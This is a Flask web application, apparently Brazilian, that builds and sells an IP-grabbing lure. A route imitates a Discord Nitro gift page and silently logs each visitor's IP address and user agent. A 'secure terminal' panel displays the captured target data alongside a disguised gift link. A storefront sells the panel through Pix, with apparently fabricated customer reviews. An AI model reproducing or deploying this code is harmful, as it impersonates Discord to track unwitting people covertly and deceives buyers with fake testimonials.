import os
import json
import random
import string
from datetime import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)

LOGS_FILE = "latest_log.json"

def carregar_ultimo_log():
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return None
    return None

def salvar_ultimo_log(dados):
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(dados, f, ensure_ascii=False, indent=2)

# Template HTML da página falsa do Discord (Sistema de Rastreamento)
DISCORD_NITRO_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Your Gift Is Here</title>
    <style>
        body { background-color: #313338; color: #dbdee1; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.3); max-width: 420px; width: 100%; }
        .nitro-img { width: 100px; height: 100px; margin-bottom: 20px; }
        h2 { color: #f2f3f5; font-size: 22px; margin-bottom: 10px; }
        p { font-size: 14px; color: #949ba4; line-height: 20px; margin-bottom: 24px; }
        .btn { background-color: #5865f2; color: white; border: none; padding: 12px 24px; font-size: 14px; font-weight: 500; border-radius: 3px; cursor: pointer; width: 100%; text-decoration: none; display: inline-block; box-sizing: border-box; }
        .btn:hover { background-color: #4752c4; }
    </style>
</head>
<body>
    <div class="container">
        <svg class="nitro-img" viewBox="0 0 127.14 96.36" fill="#5865f2">
            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.79,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.81,11.1,105.25,105.25,0,0,0,32.25-16.15c2.63-27.23-4.53-51.37-20.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.9,53,48.71,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5.18-12.72,11.45-12.72S96.14,46,96.14,53,90.95,65.69,84.69,65.69Z"/>
        </svg>
        <h2>Gift Link Has Expired</h2>
        <p>This gift link has either been already claimed or has expired.</p>
        <a href="https://discord.com/login" class="btn">Login to Discord</a>
    </div>
</body>
</html>
"""

# Template HTML do Painel de Monitoramento Secreto (/painel)
PANEL_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANONYMOUS_INTERCEPT // SECURE TERMINAL</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body { background-color: #030712; color: #38bdf8; font-family: 'Share Tech Mono', monospace; margin: 0; padding: 20px; overflow-x: hidden; height: 100vh; }
        .bg-anonymous { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(3, 7, 18, 0.85), rgba(3, 7, 18, 0.92)), url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1920&auto=format&fit=crop') no-repeat center center; background-size: cover; z-index: -2; }
        .container { max-width: 900px; margin: 0 auto; background: rgba(15, 23, 42, 0.82); backdrop-filter: blur(12px); border: 1px solid rgba(56, 189, 248, 0.3); padding: 30px; border-radius: 8px; box-shadow: 0 0 30px rgba(56, 189, 248, 0.15); }
        header { border-bottom: 1px solid rgba(56, 189, 248, 0.3); padding-bottom: 15px; margin-bottom: 25px; display: flex; justify-content: space-between; align-items: center; }
        h1 { margin: 0; font-size: 22px; color: #f8fafc; letter-spacing: 2px; }
        .signal-tower { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #38bdf8; font-weight: bold; background: rgba(56, 189, 248, 0.1); padding: 6px 12px; border: 1px solid rgba(56, 189, 248, 0.4); border-radius: 4px; }
        .tower-light { width: 10px; height: 10px; background-color: #38bdf8; border-radius: 50%; box-shadow: 0 0 10px #38bdf8; animation: pulse-tower 1s infinite alternate; }
        @keyframes pulse-tower { 0% { opacity: 0.3; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1.2); } }
        .card { background: rgba(3, 7, 18, 0.7); border: 1px solid rgba(56, 189, 248, 0.2); padding: 20px; border-radius: 4px; margin-bottom: 20px; }
        h3 { margin-top: 0; color: #f8fafc; font-size: 15px; letter-spacing: 1px; border-left: 3px solid #38bdf8; padding-left: 10px; }
        .link-box { background: #020617; border: 1px dashed rgba(56, 189, 248, 0.4); padding: 12px; font-size: 15px; color: #38bdf8; word-break: break-all; }
        .target-box { background: #020617; border: 1px solid rgba(56, 189, 248, 0.4); padding: 20px; }
        .target-item { margin-bottom: 12px; font-size: 15px; color: #cbd5e1; }
        .ip-highlight { color: #f43f5e; font-weight: bold; font-size: 22px; }
        .footer { text-align: center; font-size: 11px; color: #64748b; margin-top: 30px; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="bg-anonymous"></div>
    <div class="container">
        <header>
            <h1>[ANON_SYS] // SECURE_TERMINAL</h1>
            <div class="signal-tower"><div class="tower-light"></div>EXPECT US</div>
        </header>
        <div class="card">
            <h3>TARGET_DISPATCH_URL</h3>
            <div class="link-box" id="track-link">INITIALIZING...</div>
        </div>
        <div class="card">
            <h3>INTERCEPTED_TARGET_DATA</h3>
            <div class="target-box">
                {% if log %}
                    <div class="target-item"><strong>TIMESTAMP:</strong> {{ log.data }}</div>
                    <div class="target-item"><strong>TARGET_IP:</strong> <span class="ip-highlight">{{ log.ip }}</span></div>
                    <div class="target-item"><strong>DEVICE_AGENT:</strong> {{ log.user_agent }}</div>
                {% else %}
                    <div style="color: #64748b; text-align: center; padding: 15px;">[ AGUARDANDO SINAL DO ALVO... ]</div>
                {% endif %}
            </div>
        </div>
        <div class="footer">WE ARE LEGION // PROTOCOL: STEALTH_ON</div>
    </div>
    <script>
        document.getElementById('track-link').innerText = 'https://sl1nk.com/discord-nitro-gift-7x9kl5t';
        setTimeout(function(){ window.location.reload(); }, 3000);
    </script>
</body>
</html>
"""

# Template HTML da Loja Oficial (Tema Roxo e Preto com aba Produtos)
STORE_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBER_CORE // Official Store</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { background-color: #0b0713; color: #e2e8f0; line-height: 1.6; }
        header { background: #130b22; border-bottom: 1px solid #2b174a; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 20px; font-weight: 700; color: #c084fc; text-shadow: 0 0 10px rgba(192,132,252,0.4); }
        .nav-links { display: flex; gap: 25px; align-items: center; }
        .nav-links a { color: #cbd5e1; text-decoration: none; font-weight: 600; font-size: 14px; transition: 0.3s; }
        .nav-links a:hover { color: #c084fc; }
        
        .hero { text-align: center; padding: 70px 20px; background: radial-gradient(circle at center, #231245 0%, #0b0713 70%); }
        .hero h1 { font-size: 40px; color: #fff; margin-bottom: 15px; }
        .hero h1 span { color: #c084fc; }
        .hero p { font-size: 15px; color: #94a3b8; max-width: 600px; margin: 0 auto 25px auto; }
        
        .container { max-width: 1000px; margin: 0 auto; padding: 40px 20px; }
        .section-title { font-size: 24px; color: #fff; margin-bottom: 25px; text-align: center; border-bottom: 2px solid #2b174a; padding-bottom: 10px; }
        
        /* Grid de Produtos (Fácil de adicionar novos blocos no futuro) */
        .products-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin-bottom: 50px; }
        .product-card { background: #130b22; border: 1px solid #2b174a; padding: 25px; border-radius: 10px; display: flex; flex-direction: column; justify-content: space-between; transition: 0.3s; }
        .product-card:hover { border-color: #9333ea; box-shadow: 0 0 20px rgba(147,51,234,0.15); }
        .product-card h3 { color: #c084fc; margin-bottom: 10px; font-size: 20px; }
        .product-card p { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
        .product-price { font-size: 22px; color: #fff; font-weight: 700; margin-bottom: 20px; }
        .btn-buy { background: #9333ea; color: #fff; padding: 12px; font-size: 14px; font-weight: 600; border-radius: 6px; text-decoration: none; text-align: center; box-shadow: 0 0 15px rgba(147,51,234,0.4); transition: 0.3s; display: block; }
        .btn-buy:hover { background: #a855f7; box-shadow: 0 0 25px rgba(168,85,247,0.7); }

        /* Checkout / Pagamento Pix */
        .checkout-box { background: #130b22; border: 2px solid #9333ea; border-radius: 12px; padding: 35px; text-align: center; margin-bottom: 50px; box-shadow: 0 0 25px rgba(147,51,234,0.2); }
        .checkout-box h2 { color: #fff; margin-bottom: 15px; }
        .order-key { background: #0b0713; border: 1px dashed #9333ea; padding: 12px; font-family: monospace; font-size: 18px; color: #fff; margin-bottom: 20px; border-radius: 6px; letter-spacing: 1px; }
        .qrcode-placeholder { background: #fff; width: 180px; height: 180px; margin: 0 auto 20px auto; border-radius: 8px; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .qrcode-placeholder img { width: 100%; height: 100%; }

        /* Feedbacks */
        .reviews { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 50px; }
        .review-card { background: #130b22; border: 1px solid #2b174a; padding: 20px; border-radius: 10px; }
        .review-author { color: #c084fc; font-weight: 600; margin-bottom: 5px; font-size: 14px; }
        .review-text { color: #cbd5e1; font-size: 13px; }

        /* Tutorial */
        .tutorial-box { background: linear-gradient(135deg, #130b22, #1e1138); border: 1px solid #4c1d95; padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 50px; }
        .tutorial-box h3 { color: #fff; margin-bottom: 15px; }
        .btn-tutorial { background: transparent; border: 2px solid #c084fc; color: #c084fc; padding: 10px 25px; border-radius: 6px; text-decoration: none; font-weight: 600; transition: 0.3s; display: inline-block; }
        .btn-tutorial:hover { background: #c084fc; color: #0b0713; }

        footer { text-align: center; padding: 25px; color: #64748b; font-size: 13px; border-top: 1px solid #2b174a; background: #130b22; }
    </style>
</head>
<body>
    <header>
        <div class="logo">⚡ CYBER_CORE SYSTEM</div>
        <div class="nav-links">
            <a href="#produtos">Produtos</a>
            <a href="#checkout">Pagamento</a>
            <a href="#tutoriais">Tutorial</a>
        </div>
    </header>

    <div class="hero">
        <h1>Loja Oficial <span>Cyber Core</span></h1>
        <p>Adquira ferramentas profissionais de alta performance com entrega imediata e suporte dedicado.</p>
    </div>

    <div class="container">
        <!-- SEÇÃO DE PRODUTOS (Para adicionar novos no futuro, basta copiar o bloco product-card abaixo) -->
        <h2 id="produtos" class="section-title">Nossos Produtos</h2>
        <div class="products-grid">
            
            <!-- Produto 1 (Atual) -->
            <div class="product-card">
                <div>
                    <h3>Painel de Monitoramento v1.0</h3>
                    <p>Acesso completo ao sistema de rastreamento em tempo real com interface camuflada, radar e atualizações vitalícias.</p>
                </div>
                <div>
                    <div class="product-price">R$ 49,90</div>
                    <a href="#checkout" class="btn-buy">COMPRAR AGORA</a>
                </div>
            </div>

            <!-- Exemplo de como adicionar futuros produtos facilmente:
            <div class="product-card">
                <div>
                    <h3>Nome do Novo Produto</h3>
                    <p>Descrição curta do que o produto faz.</p>
                </div>
                <div>
                    <div class="product-price">R$ XX,XX</div>
                    <a href="#checkout" class="btn-buy">COMPRAR AGORA</a>
                </div>
            </div>
            -->

        </div>

        <!-- Área de Pagamento com Chave e QR Code Dinâmicos -->
        <div id="checkout" class="checkout-box">
            <h2>Área de Pagamento Seguro (Pix)</h2>
            <p style="color: #94a3b8; margin-bottom: 15px; font-size: 14px;">Chave do Pedido Gerada Automaticamente:</p>
            <div class="order-key">{{ chave_pedido }}</div>
            <p style="color: #c084fc; margin-bottom: 15px; font-size: 14px;">Escaneie o QR Code abaixo com o app do seu banco:</p>
            <div class="qrcode-placeholder">
                <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data={{ qr_data }}" alt="QR Code Pix">
            </div>
            <p style="font-size: 13px; color: #94a3b8;">Após realizar o pagamento, envie o comprovante e a sua <strong>Chave de Pedido</strong> no suporte.</p>
        </div>

        <h2 class="section-title">Avaliações da Galeria</h2>
        <div class="reviews">
            <div class="review-card">
                <div class="review-author">@marcos_dev</div>
                <div class="review-text">"Simplesmente perfeito! O painel atualiza muito rápido e a interface é impecável. Vale cada centavo."</div>
            </div>
            <div class="review-card">
                <div class="review-author">@luiz_mm</div>
                <div class="review-text">"Ferramenta braba demais, suporte super atencioso e o sistema nunca cai. Recomendo muito!"</div>
            </div>
            <div class="review-card">
                <div class="review-author">@VitorH</div>
                <div class="review-text">"Melhor painel que já utilizei. Muito fácil de configurar e usar no dia a dia."</div>
            </div>
        </div>

        <h2 id="tutoriais" class="section-title">Guia & Tutoriais</h2>
        <div class="tutorial-box">
            <h3>Precisa de ajuda para configurar ou usar?</h3>
            <p style="color: #94a3b8; margin-bottom: 20px; font-size: 14px;">Preparamos um guia passo a passo em vídeo e texto para você começar a operar em menos de 5 minutos.</p>
            <a href="https://youtube.com" target="_blank" class="btn-tutorial">ACESSAR TUTORIAL COMPLETO</a>
        </div>
    </div>

    <footer>
        CYBER_CORE SYSTEM © 2026 - Todos os direitos reservados.
    </footer>
</body>
</html>
"""

@app.route('/nitro/<path:subpath>')
def nitro_fake(subpath):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    data_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    salvar_ultimo_log({
        "ip": ip,
        "user_agent": user_agent,
        "data": data_hora
    })

    return render_template_string(DISCORD_NITRO_HTML)

@app.route('/painel')
def painel():
    log = carregar_ultimo_log()
    return render_template_string(PANEL_HTML, log=log)

@app.route('/')
def store():
    letras_numeros = string.ascii_uppercase + string.digits
    chave_aleatoria = ''.join(random.choices(letras_numeros, k=16))
    chave_formatada = f"PIX-{chave_aleatoria[:4]}-{chave_aleatoria[4:8]}-{chave_aleatoria[8:12]}-{chave_aleatoria[12:]}"
    
    qr_payload = f"00020126580014br.gov.bcb.pix0136suporte@cybercore.com5204000053039865802BR5913CYBER_CORE6009SAO_PAULO62070503{chave_aleatoria}"

    return render_template_string(STORE_HTML, chave_pedido=chave_formatada, qr_data=qr_payload)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)